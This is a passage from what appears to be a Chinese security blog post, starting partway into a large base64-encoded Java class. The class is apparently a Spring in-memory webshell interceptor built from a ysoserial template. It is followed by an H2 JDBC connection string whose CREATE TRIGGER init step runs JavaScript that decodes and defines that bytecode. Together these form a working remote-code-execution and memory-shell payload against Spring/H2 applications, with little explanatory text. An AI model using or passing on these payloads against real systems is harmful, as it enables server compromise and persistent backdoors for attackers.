dMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkQUVBSm1waGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObEFRQVhhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZSbWxsYkdRQkFDWnZjbWN2WVhCaFkyaGxMM1J2YldOaGRDOTFkR2xzTDJoMGRIQXZVR0Z5WVcxbGRHVnljd0VBRW1waGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2dFQUUycGhkbUY0TDJOeWVYQjBieTlEYVhCb1pYSUJBQVpoY0hCbGJtUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUFoMGIxTjBjbWx1WndFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFIWm05eVRtRnRaUUVBSlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBbG5aWFJOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFJWjJWMFEyeGhjM01CQUJNb0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFHMnBoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkQUVBQzJkbGRFbHVjM1JoYm1ObEFRQXhLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUNHZGxkRUo1ZEdWekFRQUVLQ2xiUWdFQUJteGxibWQwYUFFQUF5Z3BTUUVBQm5Wd1pHRjBaUUVBQnloYlFrbEpLVllCQUFaa2FXZGxjM1FCQUFZb1NWdENLVllCQUJVb1NTbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQXQwYjFWd2NHVnlRMkZ6WlFFQUNXZGxkRWhsWVdSbGNnRUFFR1Z4ZFdGc2MwbG5ibTl5WlVOaGMyVUJBQlVvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZvQkFBZHBjMFZ0Y0hSNUFRQURLQ2xhQVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBaGpiMjUwWVdsdWN3RUFHeWhNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BXZ0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUJHVjRaV01CQUNnb1cweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTTdBUUFSYW1GMllTOXNZVzVuTDFCeWIyTmxjM01CQUE1blpYUkpibkIxZEZOMGNtVmhiUUVBRnlncFRHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdBUUFZS0V4cVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdE95bFdBUUFNZFhObFJHVnNhVzFwZEdWeUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOTFkR2xzTDFOallXNXVaWEk3QVFBSloyVjBWM0pwZEdWeUFRQVhLQ2xNYW1GMllTOXBieTlRY21sdWRGZHlhWFJsY2pzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFIY0hKcGJuUnNiZ0VBRlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFZnRUFCbVZ4ZFdGc2N3RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUNtZGxkRk5sYzNOcGIyNEJBQ0lvS1V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sYzNOcGIyNDdBUUFEY0hWMEFRQTRLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFsblpYUlNaV0ZrWlhJQkFCb29LVXhxWVhaaEwybHZMMEoxWm1abGNtVmtVbVZoWkdWeU93RUFGbXBoZG1FdmFXOHZRblZtWm1WeVpXUlNaV0ZrWlhJQkFBaHlaV0ZrVEdsdVpRRUFFR2RsZEVSbFkyeGhjbVZrUm1sbGJHUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5R2FXVnNaRHNCQUExelpYUkJZMk5sYzNOcFlteGxBUUFFS0ZvcFZnRUFBMmRsZEFFQUppaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFOWjJWMFVHRnlZVzFsZEdWeWN3RUFLaWdwVEc5eVp5OWhjR0ZqYUdVdmRHOXRZMkYwTDNWMGFXd3ZhSFIwY0M5UVlYSmhiV1YwWlhKek93RUFDR1Z1ZEhKNVUyVjBBUUFSS0NsTWFtRjJZUzkxZEdsc0wxTmxkRHNCQUExcVlYWmhMM1YwYVd3dlUyVjBBUUFXS0NsTWFtRjJZUzkxZEdsc0wwbDBaWEpoZEc5eU93RUFCMmhoYzA1bGVIUUJBQTFxWVhaaEwzVjBhV3d2VFdGd0FRQUdaMlYwUzJWNUFRQUtjbVZ3YkdGalpVRnNiQUVBT0NoTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUlaMlYwVm1Gc2RXVUJBQVJ6YVhwbEFRQVZLRWtwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBSWNIVjBWbUZzZFdVQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVllCQUNrb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd0VBRnloYlFreHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFFYVc1cGRBRUFGeWhKVEdwaGRtRXZjMlZqZFhKcGRIa3ZTMlY1T3lsV0FRQVJhbUYyWVM5c1lXNW5MMGx1ZEdWblpYSUJBQVJVV1ZCRkFRQVJaMlYwUkdWamJHRnlaV1JOWlhSb2IyUUJBQWRrYjBacGJtRnNBUUFHS0Z0Q0tWdENBUUFRYW1GMllTOXNZVzVuTDFSb2NtVmhaQUVBRFdOMWNuSmxiblJVYUhKbFlXUUJBQlFvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrT3dFQUZXZGxkRU52Ym5SbGVIUkRiR0Z6YzB4dllXUmxjZ0VBR1NncFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUFkMllXeDFaVTltQVFBV0tFa3BUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPd0VBREdkbGRGQmhjbUZ0WlhSbGNnRUFLU2hiVEdwaGRtRXZibVYwTDFWU1REdE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUpjM1ZpYzNSeWFXNW5BUUFXS0VsSktVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCWGR5YVhSbEFRQUxkRzlDZVhSbFFYSnlZWGtBSVFDVEFKUUFBQUFFQUFBQWxRQ1dBQUFBQUFDWEFKWUFBQUFBQUpnQWxnQUFBQUFBbVFDYUFBQUFCZ0FCQUpzQW5BQUJBSjBBQUFCbUFBTUFBUUFBQURBcXR3QUJLaElDdFFBREtoSUV0UUFGS3JzQUJsbTNBQWNxdEFBRnRnQUlLclFBQTdZQUNMWUFDYmdBQ3JVQUM3RUFBQUFDQUo0QUFBQVNBQVFBQUFBWEFBUUFHUUFLQUJvQUVBQWJBSjhBQUFBTUFBRUFBQUF3QUtBQW9RQUFBQWtBb2dDakFBSUFuUUFBQVVvQUJnQUZBQUFBZUFGTkVneTRBQTFNS3hJT0FiWUFEeXNCdGdBUVRpMjJBQkVTRWdTOUFCTlpBeElVVTdZQUR5MEV2UUFWV1FNcVU3WUFFTUFBRnNBQUZrMm5BRHhPRWhpNEFBMU1LN1lBR1RvRUdRUzJBQkVTR2dTOUFCTlpBeElVVTdZQUR4a0VCTDBBRlZrREtsTzJBQkRBQUJiQUFCWk5wd0FGT2dRc3NBQUNBQUlBT2dBOUFCY0FQZ0J4QUhRQUZ3QURBSjRBQUFBeUFBd0FBQUFnQUFJQUlnQUlBQ01BRlFBa0FEb0FMQUE5QUNVQVBnQW5BRVFBS0FCS0FDa0FjUUFyQUhRQUtnQjJBQzBBbndBQUFFZ0FCd0FWQUNVQXBBQ2xBQU1BQ0FBMUFLWUFtZ0FCQUVvQUp3Q2tBS1VBQkFCRUFEQUFwZ0NhQUFFQVBnQTRBS2NBcUFBREFBQUFlQUNwQUpZQUFBQUNBSFlBcWdDckFBSUFyQUFBQUNvQUEvOEFQUUFEQndDdEFBY0FGZ0FCQndDdS93QTJBQVFIQUswQUJ3QVdCd0N1QUFFSEFLNzZBQUVBcndBQUFBUUFBUUFYQUFrQW1BQ3dBQUVBblFBQUFLY0FCQUFEQUFBQU1BRk1FaHU0QUJ4TkxDcTJBQjBES3JZQUhyWUFIN3NBSUZrRUxMWUFJYmNBSWhBUXRnQWp0Z0FrVEtjQUJFMHJzQUFCQUFJQUtnQXRBQmNBQXdDZUFBQUFIZ0FIQUFBQU1RQUNBRFFBQ0FBMUFCVUFOZ0FxQURnQUxRQTNBQzRBT1FDZkFBQUFJQUFEQUFnQUlnQ3hBTElBQWdBQUFEQUFzd0NXQUFBQUFnQXVBTFFBbGdBQkFLd0FBQUFUQUFML0FDMEFBZ2NBclFjQXJRQUJCd0N1QUFBSkFMVUF0Z0FDQUowQUFBRkVBQVlBQlFBQUFISUJUUklNdUFBTlRDc1NKUUcyQUE4ckFiWUFFRTR0dGdBUkVpWUV2UUFUV1FNU0ZsTzJBQTh0QkwwQUZWa0RLbE8yQUJEQUFCUk5wd0E1VGhJbnVBQU5UQ3UyQUJrNkJCa0V0Z0FSRWlnRXZRQVRXUU1TRmxPMkFBOFpCQVM5QUJWWkF5cFR0Z0FRd0FBVVRhY0FCVG9FTExBQUFnQUNBRGNBT2dBWEFEc0Fhd0J1QUJjQUF3Q2VBQUFBTWdBTUFBQUFQZ0FDQUVBQUNBQkJBQlVBUWdBM0FFb0FPZ0JEQURzQVJRQkJBRVlBUndCSEFHc0FTUUJ1QUVnQWNBQkxBSjhBQUFCSUFBY0FGUUFpQUxjQXBRQURBQWdBTWdDbUFKb0FBUUJIQUNRQXR3Q2xBQVFBUVFBdEFLWUFtZ0FCQURzQU5RQ25BS2dBQXdBQUFISUFxUUNyQUFBQUFnQndBS29BbGdBQ0FLd0FBQUFxQUFQL0FEb0FBd2NBRmdBSEFLMEFBUWNBcnY4QU13QUVCd0FXQUFjQXJRY0FyZ0FCQndDdStnQUJBSzhBQUFBRUFBRUFGd0FCQUxnQXVRQUNBSjBBQUFmR0FBY0FGQUFBQkJjckVpbTVBQ29DQUJJcnRnQXNtUVFES3pvRUxEb0ZHUVRCQUMyYUFEY1NMaEl2QTcwQUU3WUFEem9HR1FZckE3MEFGYllBRURvRUdRVEJBQzJaQUFhbkFCTVpCaGtFQTcwQUZiWUFFRG9FcC8vb0dRWEJBRENhQURjU01SSXlBNzBBRTdZQUR6b0dHUVlzQTcwQUZiWUFFRG9GR1FYQkFEQ1pBQWFuQUJNWkJoa0ZBNzBBRmJZQUVEb0ZwLy9vS3hJenVRQXFBZ0FTTkxZQUxKa0FoaXNTTkxrQUtnSUFPZ1laQnNZQWRCa0d0Z0ExbWdCc0FUb0hFamE0QURlMkFEZ1NPYllBT3BrQUd3YTlBQlJaQXhJMFUxa0VFanRUV1FVWkJsTTZCNmNBR0FhOUFCUlpBeEk4VTFrRUVqMVRXUVVaQmxNNkI3c0FQbG00QUQ4WkI3WUFRTFlBUWJjQVFoSkR0Z0JFdGdCRk9nZ1pCY0FBTUxZQVJoa0l0Z0JIcHdMd0t4SXp1UUFxQWdBU1NMWUFMSmtCNWl1NUFFa0JBQkpLdGdCTG1RTFN1d0JNV2JjQVRUb0dHUVRBQUMyMkFFNDZCeGtHRWs4WkJMWUFVRmNaQmhKUkdRVzJBRkJYR1FZU1Voa0h0Z0JRVnl1NUFGTUJBTFlBVkRvSUdRakdBQXNaQ0xZQU5aa0E5QkpWT2dnWkJMWUFFUkpQdGdCV09na1pDUVMyQUZjWkNSa0V0Z0JZd0FCWk9nb1pDcllBRVJKYXRnQldPZ3NaQ3dTMkFGY1pDeGtLdGdCWXdBQmJPZ3daRExZQVhEb05HUTIyQUJFU1hiWUFWam9PR1E0RXRnQlhHUTRaRGJZQVdNQUFYam9QR1ErMkFGKzVBR0FCQURvUUdSQzVBR0VCQUprQWVSa1F1UUJpQVFEQUFHTTZFUmtSdVFCa0FRREFBQlFTWlJKbXRnQm5PaElaRWJrQWFBRUF3QUJwT2hNWkU3WUFhcG9BSExzQUJsbTNBQWNaQ0xZQUNCa1N0Z0FJdGdBSk9naW5BQ3E3QUFaWnR3QUhHUWkyQUFnWkVyWUFDQkpydGdBSUdSTUR0Z0Jzd0FBVXRnQUl0Z0FKT2dpbi80TVNBam9KR1FjU2JSa0p1UUJ1QXdBU2I3Z0FjRG9LR1FvRnV3QnhXUmtKdGdBZEVtKzNBSEsyQUhNU2RMZ0FEUkoxQnIwQUUxa0RFaFpUV1FTeUFIWlRXUVd5QUhaVHRnQjNPZ3NaQ3dTMkFIZ1pDcnNBZVZtM0FIb1pDTFlBZTdZQWZEb01HUXU0QUgyMkFINEd2UUFWV1FNWkRGTlpCQU80QUg5VFdRVVpETDY0QUg5VHRnQVF3QUFUT2cwWkRiWUFHUmtHdGdDQVY2Y0EvU3NTTTdrQUtnSUFFb0cyQUN5WkFPMHJLclFBQmJrQWdnSUF1QUNET2dZcUdRWUR0Z0NFT2dZcXRBQ0Z4d0JrdXdDR1dRTzlBSWU0QUgyMkFINjNBSWc2QnhLSkVuVUd2UUFUV1FNU0ZsTlpCTElBZGxOWkJiSUFkbE8yQUhjNkNCa0lCTFlBZUNvWkNCa0hCcjBBRlZrREdRWlRXUVFEdUFCL1Uxa0ZHUWErdUFCL1U3WUFFTUFBRTdVQWhhY0FiYnNBaWxtM0FJczZCeXEwQUlXMkFCazZDQmtJR1FlMkFJQlhHUWdaQnJZQWdGY1pDQ3UyQUlCWExMa0FqQUVBS3JRQUN3TVFFTFlBamJZQWpoa0l0Z0NQVnl5NUFJd0JBQ29aQjdZQWtBUzJBSVM0QUpHMkFJNHN1UUNNQVFBcXRBQUxFQkMyQUpLMkFJNERyS2NBQlRvRUJLd0FBUUFBQkE4RUV3QVhBQVFBbmdBQUFVNEFVd0FBQUZJQUVBQlRBQk1BVkFBV0FGY0FIZ0JZQUNzQVdRQTNBRnNBUWdCY0FGSUFZQUJhQUdFQVp3QmlBSE1BWkFCK0FHVUFqZ0JwQUo0QWFnQ29BR3NBdFFCc0FMZ0FiUURJQUc0QTRBQndBUFVBY2dFUkFITUJIZ0IxQVRFQWRnRS9BSGdCU0FCN0FWSUFmQUZjQUgwQlpnQitBWEFBZ0FGN0FJRUJpQUNDQVl3QWhBR1lBSVVCbmdDR0Fhb0FpQUcyQUlrQnZBQ0tBY2dBaXdIUEFJd0Iyd0NOQWVFQWpnSHRBSkFCK1FDUkFnTUFrZ0lQQUpNQ0lnQ1VBaTRBbFFJMkFKWUNUd0NZQW5ZQW1nSjVBSjhDZlFDZ0FvZ0FvUUtQQUtJQ293Q2pBc1FBcEFMS0FLVUMzUUNtQXdZQXB3TVJBS2dERkFDcEF5UUFxd016QUt3RFBBQ3RBME1BcmdOV0FLOERkQUN3QTNvQXNRT2hBTElEcEFDekE2MEF0QU8yQUxVRHZnQzJBOFlBdHdQTkFMZ0Q0QUM1QStZQXVnUDhBTHNFRGdDK0JCQUF3Z1FUQU1BRUZRRERBSjhBQUFGZ0FDTUFLd0FuQUxvQXV3QUdBR2NBSndDOEFMc0FCZ0M0QUdZQXZRQytBQWNCRVFBTkFMOEFsZ0FJQUtnQWRnREFBSllBQmdJUEFHY0F3UURFQUJFQ0lnQlVBTVVBbGdBU0FpNEFTQURHQU1jQUV3R1lBT0VBeUFESkFBa0JxZ0RQQU1vQXl3QUtBYllBd3dETUFNa0FDd0hJQUxFQXpRRE9BQXdCendDcUFNOEEwQUFOQWRzQW5nRFJBTWtBRGdIdEFJd0EwZ0RUQUE4QitRQ0FBTlFBMVFBUUFVZ0J5UURXQU5jQUJnRlNBYjhBMkFEWkFBY0Jld0dXQUprQWxnQUlBbjBBbEFEYUFKWUFDUUtQQUlJQTJ3RGNBQW9DeEFCTkFOMEF1d0FMQXQwQU5BRGVBS3NBREFNR0FBc0Ezd0NhQUEwRFZnQkxBT0FBNFFBSEEzUUFMUURpQUxzQUNBT3RBR0VBNHdEa0FBY0R0Z0JZQU9VQXBRQUlBek1BMndEbUFLc0FCZ0FUQS8wQTV3Q2xBQVFBRmdQNkFPZ0FwUUFGQUFBRUZ3Q2dBS0VBQUFBQUJCY0E2UURxQUFFQUFBUVhBT3NBN0FBQ0FBQUVGd0R0QUtVQUF3RHVBQUFBSUFBREFnOEFad0RCQU84QUVRSXVBRWdBeGdEd0FCTUIrUUNBQU5RQThRQVFBS3dBQUFDMUFCWCtBRGNIQVBJSEFQSUhBUE1LK2dBUC9BQWdCd0R6Q3ZvQUQvMEFVUWNBclFjQTlCVDVBQ2dDL2dCbUJ3RDFCd0QyQndDdC93QndBQkVIQVBjSEFQZ0hBUGtIQVBJSEFQSUhBUElIQVBVSEFQWUhBSzBIQVBvSEFQc0hBUG9IQVB3SEFQMEhBUG9IQVA0SEFQOEFBUDRBVlFjQkFBY0FyUWNCQWZnQUp2OEFBZ0FKQndEM0J3RDRCd0Q1QndEeUJ3RHlCd0R5QndEMUJ3RDJCd0N0QUFENEFKcjhBSThIQUJiNkFHbjVBQUZDQndDdUFRQ3ZBQUFBQkFBQkFCY0FBUUVDQVFNQUFRQ2RBQUFBMkFBR0FBUUFBQUFzRW0rNEFIQk9MUnlaQUFjRXB3QUVCYnNBY1ZrcXRBQUR0Z0FkRW0rM0FISzJBSE10SzdZQWZMQk9BYkFBQVFBQUFDZ0FLUUFYQUFNQW5nQUFBQllBQlFBQUFNZ0FCZ0RKQUNNQXlnQXBBTXNBS2dETUFKOEFBQUEwQUFVQUJnQWpBTnNBM0FBREFDb0FBZ0NuQUtnQUF3QUFBQ3dBb0FDaEFBQUFBQUFzQUxNQXF3QUJBQUFBTEFDeEFRUUFBZ0NzQUFBQVBBQUQvd0FQQUFRSEFQY0hBQllCQndFRkFBRUhBUVgvQUFBQUJBY0E5d2NBRmdFSEFRVUFBZ2NCQlFIL0FCZ0FBd2NBOXdjQUZnRUFBUWNBcmdBQ0FRWUFBQUFDQVFjQXd3QUFBQW9BQVFCakFXa0F3Z1lKAQA7b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5zdXBwb3J0LlJlcXVlc3RDb250ZXh0VXRpbHMMAIoAiwEAD2phdmEvbGFuZy9DbGFzcwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QMAIwAjQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABlmaW5kV2ViQXBwbGljYXRpb25Db250ZXh0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAcAiQwAjgCPAQAQamF2YS9sYW5nL09iamVjdAcAkAwAkQCSAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwAkwCUDACVAJYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLm1ldGhvZC5hbm5vdGF0aW9uLlJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAJcAmAEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAob3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbgEATm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLmFubm90YXRpb24uRGVmYXVsdEFubm90YXRpb25IYW5kbGVyTWFwcGluZwwAmQCaBwCbDACcAJ0BABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAngCfDACgAKEHAKIMAKMApAwApQCmAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCnDACoADoBADZ5c29zZXJpYWwucGF5bG9hZHMudGVtcGxhdGVzLlNwcmluZ0ludGVyY2VwdG9yVGVtcGxhdGUMAKkAqgwAqwCLDACsAK0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAGSW5qZXh0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJbG9hZENsYXNzAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaACEALAANAAAAAAACAAEALQAuAAEALwAAADMAAQABAAAABSq3AAGxAAAAAgAwAAAACgACAAAAMAAEADIAMQAAAAwAAQAAAAUAMgAzAAAACAA0AC4AAQAvAAAC4gAGAAoAAAEOEgJLEgO4AAROLRIFBL0ABlkDEgdTtgAITKcAFToELRIKBL0ABlkDEgtTtgAITCsEtgAMKwEEvQANWQO4AA7AAA+2ABBTtgARwAASOgQSE7gABDoFGQQZBbkAFAIAwAAVTacAGToFEhe4AAQ6BhkEGQa5ABQCAMAAFU0SFRIYtgAZOgUZBQS2ABoZBSy2ABvAABw6BhIdtgAewAAdKrYAHzoHuAAgtgAhOggSIhIjB70ABlkDEiRTWQQSJVNZBbIAJlNZBrIAJlO2AAg6CRkJBLYADBkJGQgHvQANWQMSJ1NZBBkHU1kFA7gAKFNZBhkHvrgAKFO2ABFXGQYZCBIntgAptgAetgAqV6cABE6xAAMACQAZABwACQBNAGEAZAAWAAMBCQEMACsABAAwAAAAagAaAAAAEQADABUACQAXABkAGgAcABgAHgAZAC4AGwAzABwATQAeAFQAHwBhACMAZAAgAGYAIQBtACIAegAkAIMAJQCJACYAlAAnAKIAKACqACkAzQAqANMAKwD5ACwBCQAuAQwALQENAC8AMQAAAKIAEAAZAAMANQA2AAEAHgAQADcAOAAEAFQADQA5ADoABQBhAAMAOwA8AAIAbQANAD0AOgAGAGYAFAA+AD8ABQAJAQAAQAA6AAMATQC8AEEAQgAEAIMAhgBDAEQABQCUAHUARQBGAAYAogBnAEcASAAHAKoAXwBJAEoACADNADwASwA2AAkALgDeADUANgABAHoAkgA7ADwAAgADAQoATABNAAAATgAAACoABABUAA0AOQBPAAUAbQANAD0ATwAGAAkBAABAAE8AAwCUAHUARQBQAAYAUQAAAGIABv8AHAAEBwBSAAAHAFMAAQcAVP8AEQAEBwBSBwBVAAcAUwAA/wA1AAUHAFIHAFUABwBTBwBWAAEHAFf/ABUABQcAUgcAVQcAWAcAUwcAVgAA/wCRAAEHAFIAAQcAWfoAAAABAFoAAAACAFs='\\;var bytecode\\;try{var clsBase64 = classLoader.loadClass('java.util.Base64')\\;var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder')\\;var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz)\\;bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64)\\;} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter')\\;bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64)\\;} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder')\\;bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64)\\;}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader')\\;var clsByteArray = (new java.lang.String('a').getBytes().getClass())\\;var clsInt = java.lang.Integer.TYPE\\;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt])\\;defineClass.setAccessible(true)\\;var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length))\\;clazz.newInstance()\\;}$$&quot;,&quot;dbUsername&quot;:&quot;root&quot;,&quot;dbPassword&quot;:&quot;root&quot;}
</code></pre>
<ul>
<li>H2 Spring</li>
</ul>
<pre><code class="language-matlab">jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nvar classLoader = java.lang.Thread.currentThread().getContextClassLoader()\\;try{classLoader.loadClass('Injext').newInstance()\\;}catch (e){var clsString = classLoader.loadClass('java.lang.String')\\;var bytecodeBase64 = ''\\;var bytecode\\;try{var clsBase64 = classLoader.loadClass('java.util.Base64')\\;var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder')\\;var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz)\\;bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64)\\;} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter')\\;bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64)\\;} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder')\\;bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64)\\;}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader')\\;var clsByteArray = (new java.lang.String('a').getBytes().getClass())\\;var clsInt = java.lang.Integer.TYPE\\;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt])\\;defineClass.setAccessible(true)\\;var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length))\\;clazz.newInstance()\\;}$$
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://p.ipic.vip/qpp6nc.png" alt="img" loading="lazy"></figure>
<ul>
<li>连接方式 路径随意制定：</li>
</ul>
